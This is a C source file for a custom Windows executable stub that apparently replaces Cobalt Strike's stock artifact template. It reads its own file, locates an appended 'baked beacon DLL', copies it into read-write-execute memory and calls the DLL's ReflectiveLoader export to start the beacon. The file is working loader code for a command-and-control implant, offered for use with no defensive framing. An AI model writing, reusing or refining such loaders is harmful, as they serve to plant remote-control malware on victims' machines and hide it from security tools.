/* P4-3: our own EXE artifact template (replaces the stock artifact64big
 * pipeline at the cna call site - no jar coupling, no cavern contract).
 *
 * The cna assembles:  host_template.exe || baked beacon DLL || random pad
 * This stub reads its own file from disk, locates the appended DLL (the
 * LAST valid MZ/PE in the file), maps a flat copy RWX and calls the DLL's
 * ReflectiveLoader export with rcx = flat. The image-backed loader does
 * the rest (stomp, reloc, IAT, DllMain, container handoff).
 *
 * A normal /MT console-subsystem-free EXE with a real IAT - none of the
 * COFF packer constraints apply here. */
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>

typedef unsigned long long QWORD;
typedef ULONG_PTR(WINAPI *BW_LOADER)(LPVOID);

#define BW_MAX_FILE 0x2000000 /* 32 MB ceiling for sanity */

static void bw_die(DWORD code)
{
	ExitThread(code);
}

void bw_entry(void)
{
	char path[MAX_PATH + 8];
	HANDLE f;
	DWORD size, got, i;
	unsigned char *buf, *flat, *pe;
	QWORD len;
	DWORD lfanew, exp_rva, exp_sz;
	unsigned char *ed;
	DWORD *names, *funcs;
	WORD *ords;
	DWORD nnames, k;
	BW_LOADER loader;
	DWORD alloc;

	/* locate the appended DLL: read our own file, scan backward for a
	 * valid MZ whose PE header parses - the LAST one is the payload
	 * (our own image sits at file offset 0; the random pad after the
	 * payload never contains a full valid PE) */
	if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0)
		bw_die(1);
	f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
	                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		bw_die(2);
	size = GetFileSize(f, NULL);
	if (size == 0 || size == INVALID_FILE_SIZE || size > BW_MAX_FILE) {
		CloseHandle(f);
		bw_die(3);
	}
	buf = (unsigned char *)VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (buf == NULL) {
		CloseHandle(f);
		bw_die(4);
	}
	if (!ReadFile(f, buf, size, &got, NULL) || got != size) {
		CloseHandle(f);
		bw_die(5);
	}
	CloseHandle(f);

	pe = NULL;
	for (i = size - 0x2000; (long)i > 0; i -= 0x10) {
		if (buf[i] == 'M' && buf[i + 1] == 'Z') {
			DWORD lf = *(DWORD *)(buf + i + 0x3C);
			if (lf < 0x400 && i + lf + 0x100 < size &&
			    *(DWORD *)(buf + i + lf) == 0x00004550) {
				pe = buf + i;
				break;
			}
		}
	}
	if (pe == NULL)
		bw_die(6);
	len = size - (DWORD)(pe - buf);

	/* flat copy of the DLL, writable+executable: the image-backed loader
	 * re-protects everything it maps; this buffer is only the source
	 * (and the loader's code home until the beacon frees it via the
	 * BWCF handoff) */
	alloc = (DWORD)((len + 0xFFF) & ~0xFFFULL);
	flat = (unsigned char *)VirtualAlloc(NULL, alloc, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (flat == NULL)
		bw_die(7);
	/* volatile: a plain byte copy folds into a memcpy call, and this
	 * template links CRT-free (kernel32 only) */
	{
		volatile unsigned char *d = (volatile unsigned char *)flat;
		unsigned char *src2 = pe;
		for (i = 0; i < (DWORD)len; i++)
			d[i] = src2[i];
	}

	/* walk the DLL exports for ReflectiveLoader */
	lfanew = *(DWORD *)(flat + 0x3C);
	exp_rva = *(DWORD *)(flat + lfanew + 0x88);
	if (exp_rva == 0)
		bw_die(8);
	exp_sz = *(DWORD *)(flat + lfanew + 0x8C);
	ed = flat + exp_rva;
	nnames = *(DWORD *)(ed + 0x18);
	names = (DWORD *)(flat + *(DWORD *)(ed + 0x20));
	ords = (WORD *)(flat + *(DWORD *)(ed + 0x24));
	funcs = (DWORD *)(flat + *(DWORD *)(ed + 0x1C));
	loader = NULL;
	for (k = 0; k < nnames; k++) {
		const char *n = (const char *)(flat + names[k]);
		if (n[0] == 'R' && n[1] == 'e' && n[2] == 'f' && n[3] == 'l' &&
		    n[4] == 'e' && n[5] == 'c' && n[6] == 't' && n[7] == 'i' &&
		    n[8] == 'v' && n[9] == 'e' && n[10] == 'L' && n[11] == 'o' &&
		    n[12] == 'a' && n[13] == 'd' && n[14] == 'e' && n[15] == 'r' &&
		    n[16] == 0) {
			DWORD frva = funcs[ords[k]];
			if (!(frva >= exp_rva && frva < exp_rva + exp_sz))
				loader = (BW_LOADER)(flat + frva);
			break;
		}
	}
	if (loader == NULL)
		bw_die(9);

	loader((LPVOID)flat); /* never returns (DllMain reason 4) */
	bw_die(0);
}
